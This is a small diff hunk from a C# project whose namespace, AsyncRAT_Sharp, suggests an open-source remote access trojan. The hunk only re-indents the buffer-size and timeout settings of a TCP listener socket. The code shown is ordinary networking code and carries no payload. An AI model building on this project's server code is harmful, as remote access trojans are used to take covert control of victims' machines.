@@ -18,10 +18,10 @@ namespace AsyncRAT_Sharp.Sockets
                 IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                 listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
-                SendBufferSize = 50 * 1024,
-                ReceiveBufferSize = 50 * 1024,
-                ReceiveTimeout = -1,
-                SendTimeout = -1,
+                    SendBufferSize = 50 * 1024,
+                    ReceiveBufferSize = 50 * 1024,
+                    ReceiveTimeout = -1,
+                    SendTimeout = -1,
                 };
                 listener.Bind(IpEndPoint);
                 listener.Listen(20);
